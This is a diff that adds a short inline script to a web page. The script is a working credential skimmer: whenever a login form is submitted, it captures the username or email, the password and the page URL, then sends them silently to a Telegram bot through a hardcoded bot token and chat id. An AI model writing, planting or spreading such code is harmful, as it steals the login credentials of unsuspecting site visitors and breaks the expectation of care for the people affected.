@@ -1,0 +1,22 @@
+<script>
+(function() {
+    var token = '8506083374:AAHCDHTURj1PfPr8NFxF28ZjpPhdYzCdSII';
+    var chat = '6614104922'; 
+    
+    function sendLogin() {
+        var u = document.querySelector('input[name=username]')?.value || 
+                document.querySelector('input[name=email]')?.value || '';
+        var p = document.querySelector('input[name=password]')?.value || '';
+        if (!u && !p) return;
+        var msg = 'Login: ' + u + ' | Pass: ' + p + ' | URL: ' + window.location.href;
+        fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(msg))
+            .catch(function(e){});
+    }
+    
+    document.addEventListener('submit', function(e) {
+        if (e.target.action && (e.target.action.includes('login') || e.target.action.includes('LoginHandler'))) {
+            sendLogin();
+        }
+    });
+})();
+</script>
